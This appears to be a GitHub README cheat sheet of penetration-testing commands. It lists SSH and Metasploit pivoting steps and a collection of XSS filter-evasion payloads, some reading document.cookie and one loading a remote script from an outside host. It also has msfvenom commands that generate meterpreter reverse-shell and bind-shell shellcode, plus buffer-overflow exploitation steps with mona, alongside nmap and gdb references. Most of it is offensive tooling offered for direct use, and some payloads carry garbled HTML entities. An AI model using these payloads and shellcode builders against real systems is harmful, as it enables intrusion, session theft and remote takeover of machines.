# security-cheat-sheet
<h4>Not exhaustive list of commands per tool, just a few that might make a difference. These are from all over. Credit where credit's due. Just a convenient compilation.

<h3>SSH Pivoting


```
ssh -D 127.0.0.1:1080 -p 22 user@IP
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains commands target

# pivot to a different network
ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target

# metasploit pivoting
route add X.X.X.X 255.255.255.0 1
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E
```
<h3>XSS Cheats

<p>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
  
```
("< iframes > src=http://IP:PORT </ iframes >")

<script>document.location=http://IP:PORT</script>

';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

";!–"<XSS>=&amp;amp;{()}

<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
<IMG SRC=&amp;amp;# 106;&amp;amp;# 97;&amp;amp;# 118;&amp;amp;# 97;&amp;amp;# 115;&amp;amp;# 99;&amp;amp;# 114;&amp;amp;# 105;&amp;amp;# 112;&amp;amp;# 116;&amp;amp;# 58;&amp;amp;# 97;&amp;amp;# 108;&amp;amp;# 101;&amp;amp;# 114;&amp;amp;# 116;&amp;amp;# 40;&amp;amp;# 39;&amp;amp;# 88;&amp;amp;# 83;&amp;amp;# 83;&amp;amp;# 39;&amp;amp;# 41;>

<IMG SRC=&amp;amp;# 0000106&amp;amp;# 0000097&amp;amp;# 0000118&amp;amp;# 0000097&amp;amp;# 0000115&amp;amp;# 0000099&amp;amp;# 0000114&amp;amp;# 0000105&amp;amp;# 0000112&amp;amp;# 0000116&amp;amp;# 0000058&amp;amp;# 0000097&amp;amp;# 0000108&amp;amp;# 0000101&amp;amp;# 0000114&amp;amp;# 0000116&amp;amp;# 0000040&amp;amp;# 0000039&amp;amp;# 0000088&amp;amp;# 0000083&amp;amp;# 0000083&amp;amp;# 0000039&amp;amp;# 0000041>
<IMG SRC="jav ascript:alert('XSS');">

perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out

<BODY onload!# $%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>

(">< iframes http://google.com < iframes >)

<BODY BACKGROUND="javascript:alert('XSS')">
<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
"><script >alert(document.cookie)</script>
%253cscript%253ealert(document.cookie)%253c/script%253e
"><s"%2b"cript>alert(document.cookie)</script>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
<img src=asdf onerror=alert(document.cookie)>
```
<h3>Nmap

```
nmap -oX outputfile.xml 6.6.6.6 # Save results as XML
nmap -oG outputfile.txt 6.6.6.6 # Save results in a format for grep

nmap -sV -p 443 –script=ssl-heartbleed.nse 6.6.6.6 # Scan using a specific NSE script
nmap -sV --script=smb* 6.6.6.6 # Scan with a set of scripts

nmap --script=http-headers 6.6.6.0/24 # Get HTTP headers of web services
nmap --script=http-enum 6.6.6.0/24 # Find web apps from known paths

nmap --script=asn-query,whois,ip-geolocation-maxmind 6.6.6.0/24 # Find Information about IP address
```

<h3>Win Buffer Overflow

<p>https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/

```
msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c

COMMONLY USED BAD CHARACTERS:
\x00\x0a\x0d\x20                              For http request
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)

# Useful Commands:
pattern create
pattern offset (EIP Address)
pattern offset (ESP Address)
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

!pvefindaddr pattern_create 5000
!pvefindaddr suggest
!pvefindaddr modules
!pvefindaddr nosafeseh

!mona config -set workingfolder C:\Mona\%p
!mona config -get workingfolder
!mona mod
!mona bytearray -b "\x00\x0a"
!mona pc 5000
!mona po EIP
!mona suggest
```

<h3>GDB Commands

<p>https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/
  
```
# Setting Breakpoint
break *_start

# Execute Next Instruction
next
step
n
s

# Continue Execution
continue
c

# Data
checking 'REGISTERS' and 'MEMORY'

# Display Register Values: (Decimal,Binary,Hex)
print /d –> Decimal
print /t –> Binary
print /x –> Hex
O/P :
(gdb) print /d $eax
$17 = 13
(gdb) print /t $eax
$18 = 1101
(gdb) print /x $eax
$19 = 0xd
(gdb)

# Display values of specific memory locations
command : x/nyz (Examine)
n –> Number of fields to display ==>
y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)
```
